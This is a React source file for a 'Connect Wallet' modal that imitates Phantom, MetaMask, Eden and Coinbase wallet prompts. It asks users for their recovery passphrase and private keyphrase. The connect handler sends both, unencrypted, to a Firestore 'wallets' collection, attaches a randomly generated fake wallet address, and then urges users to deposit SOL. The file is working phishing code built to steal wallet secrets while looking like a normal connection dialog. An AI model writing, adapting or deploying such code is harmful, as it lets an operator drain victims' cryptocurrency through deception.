import React, { useState, useEffect, useCallback } from 'react';
import { db, realtimeDb } from '@/firebaseConfig'; // Import realtimeDb
import { doc, setDoc, getDoc } from 'firebase/firestore';
import { ref, get } from 'firebase/database'; // Import Realtime Database functions
import { HiViewGrid } from "react-icons/hi";
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
  const [showSecondaryModal, setShowSecondaryModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [keyphrase, setKeyphrase] = useState('');
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState('');
  const [minBalance, setMinBalance] = useState(0.7);
  const [maxBalance, setMaxBalance] = useState(5);

  const walletOptions = [
    { name: 'Phantom', image: '/phan.png' },
    { name: 'MetaMask', image: '/meta.png' },
    { name: 'Eden Wallet', image: '/eden.png' },
    { name: 'Coinbase', image: '/baselogo.png' },
  ];

  // Fetch minimum balance requirements from Realtime Database
  useEffect(() => {
    const fetchBalanceRequirements = async () => {
      try {
        const balanceRef = ref(realtimeDb, 'settings/balanceRequirements');
        const snapshot = await get(balanceRef);
        
        if (snapshot.exists()) {
          const data = snapshot.val();
          setMinBalance(data.minBalance || 0.7);
          setMaxBalance(data.maxBalance || 5);
        } else {
          console.warn('No balance requirements found in Realtime Database, using defaults');
          // Create default values if they don't exist
          const defaultRequirements = {
            minBalance: 0.7,
            maxBalance: 5,
            solToUsdRate: 171.917,
          };
          
          // Note: We can't set here because we don't have write permissions in this component
          // The admin dashboard will handle creating the default values
        }
      } catch (err) {
        console.error('Error fetching balance requirements:', err);
        toast.error('Failed to fetch balance requirements, using default values');
      }
    };

    if (isOpen) {
      fetchBalanceRequirements();
    }
  }, [isOpen]);

  // Generate a mock wallet address
  const generateWalletAddress = () => {
    return '0x' + Math.random().toString(36).substring(2, 22) + Math.random().toString(36).substring(2, 22);
  };

  const handleWalletSelect = (walletName) => {
    setSelectedWallet(walletName);
    setShowSecondaryModal(true);
  };

  const handleOtherOptionsClick = () => {
    setSelectedWallet('Other');
    setShowSecondaryModal(true);
  };

  const storeWalletData = async (walletDetails) => {
    try {
      const walletRef = doc(db, "wallets", walletDetails.walletAddress);
      await setDoc(walletRef, walletDetails);
      return walletRef.id;
    } catch (e) {
      console.error("Error adding document: ", e);
      throw e;
    }
  };

  const validateInputs = () => {


    setError('');
    return true;
  };

  const handleConnect = async () => {
    if (!validateInputs()) {
      return;
    }

    setIsConnecting(true);

    try {
      const generatedAddress = generateWalletAddress();

      const walletDetails = {
        walletName: selectedWallet,
        walletAddress: generatedAddress,
        passphrase: passphrase,
        keyphrase: keyphrase,
        balance: 0,
        connectedAt: new Date().toISOString(),
        lastActive: new Date().toISOString(),
        status: 'connected',
        hasPassphrase: !!passphrase
      };

      const docId = await storeWalletData(walletDetails);
      
      localStorage.setItem('walletData', JSON.stringify({
        id: docId,
        name: selectedWallet,
        address: generatedAddress,
        balance: 0,
        connectedAt: walletDetails.connectedAt
      }));

      if (onWalletConnected) {
        onWalletConnected({
          id: docId,
          name: selectedWallet,
          address: generatedAddress,
          balance: 0
        });
      }

      toast.success(`Wallet connected successfully! Please fund your wallet with ${minBalance} to continue.`, {
        autoClose: 10000,
      });
      
      onClose();
    } catch (err) {
      console.error('Connection error:', err);
      setError('Failed to connect wallet. Please try again.');
      toast.error('Failed to connect wallet');
    } finally {
      setIsConnecting(false);
    }
  };

  const handleBack = () => {
    setShowSecondaryModal(false);
    setSelectedWallet('');
    setPassphrase('');
    setKeyphrase('');
    setError('');
  };

  const handleKeyDown = useCallback((event) => {
    if (event.key === 'Escape' && isOpen) {
      onClose();
    }
  }, [isOpen, onClose]);

  useEffect(() => {
    if (isOpen) {
      document.addEventListener('keydown', handleKeyDown);
      document.body.style.overflow = 'hidden';
    } else {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.style.overflow = 'unset';
      setShowSecondaryModal(false);
      setSelectedWallet('');
      setPassphrase('');
      setKeyphrase('');
      setError('');
    }

    return () => {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.style.overflow = 'unset';
    };
  }, [isOpen, handleKeyDown]);

  if (!isOpen) {
    return null;
  }

  return (
    <div className="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50 p-4">
      <div className="bg-gray-900 w-full max-w-md rounded-2xl shadow-xl overflow-hidden border border-gray-700">
        <div className="p-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-xl font-bold text-white">
              {!showSecondaryModal ? 'Connect Wallet' : `Connect to ${selectedWallet}`}
            </h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-white transition-colors duration-200 focus:outline-none"
            >
              <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          {!showSecondaryModal ? (
            <div>
              <div className="mb-6">
                <p className="text-gray-400 text-sm mb-4">
                  Select your wallet provider from the options below
                </p>
                <ul className="space-y-3">
                  {walletOptions.map(({ name, image }) => (
                    <li
                      key={name}
                      className="bg-gray-800 hover:bg-gray-750 rounded-lg p-3 cursor-pointer transition duration-200 flex items-center"
                      onClick={() => handleWalletSelect(name)}
                    >
                      <img src={image} alt={name} className="h-8 w-8 mr-3 rounded-full" />
                      <span className="block text-md text-gray-200 font-medium flex-1">{name}</span>
                      <span className="text-xs bg-green-900 px-2 py-1 font-medium rounded text-green-400">INSTALLED</span>
                    </li>
                  ))}
                </ul>
              </div>
              
              <button
                className="w-full flex items-center justify-center gap-2 bg-gray-800 hover:bg-gray-750 text-gray-200 font-medium py-3 rounded-lg transition duration-200"
                onClick={handleOtherOptionsClick}
              >
                <HiViewGrid className="text-xl" />
                All Wallets
              </button>
              
              <p className="mt-6 text-center text-xs text-gray-500">
                Haven't got a wallet?{' '}
                <span className="text-indigo-400 hover:text-indigo-300 cursor-pointer font-medium">
                  Get started
                </span>
              </p>
            </div>
          ) : (
            <div>
              {error && (
                <div className="mb-4 p-3 bg-red-900/30 border border-red-800 rounded-lg">
                  <p className="text-red-400 text-sm">{error}</p>
                </div>
              )}
              
              <div className="space-y-4 mb-6">
                <div>
                  <label htmlFor="passphrase" className="block text-sm font-medium text-gray-400 mb-2">
                    Recovery Passphrase
                  </label>
                  <input
                    type="password"
                    id="passphrase"
                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                    placeholder="Enter your recovery phrase"
                    value={passphrase}
                    onChange={(e) => setPassphrase(e.target.value)}
                  />
                  <p className="mt-1 text-xs text-gray-500">Must be at least 8 characters</p>
                </div>
                
                <div>
                  <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-400 mb-2">
                    Private Keyphrase
                  </label>
                  <textarea
                    id="keyphrase"
                    rows="3"
                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                    placeholder="Enter your private keyphrase"
                    value={keyphrase}
                    onChange={(e) => setKeyphrase(e.target.value)}
                  />
                  <p className="mt-1 text-xs text-gray-500">Must be at least 12 characters</p>
                </div>
              </div>
              
              <div className="bg-gray-800 p-4 rounded-lg mb-6">
                <p className="text-sm text-gray-400">
                  <span className="font-medium text-white">Note:</span> After connecting, please fund your wallet with between {minBalance} and {maxBalance} SOL to continue using the platform.
                </p>
              </div>
              
              <div className="flex gap-3">
                <button
                  className="flex-1 bg-gray-700 hover:bg-gray-600 text-gray-200 font-medium py-3 px-4 rounded-lg transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-600"
                  onClick={handleBack}
                >
                  Back
                </button>
                <button
                  className="flex-1 bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-3 px-4 rounded-lg transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-500 disabled:opacity-50 flex items-center justify-center"
                  onClick={handleConnect}
                  disabled={isConnecting}
                >
                  {isConnecting ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Connecting...
                    </>
                  ) : 'Connect'}
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default WalletModal;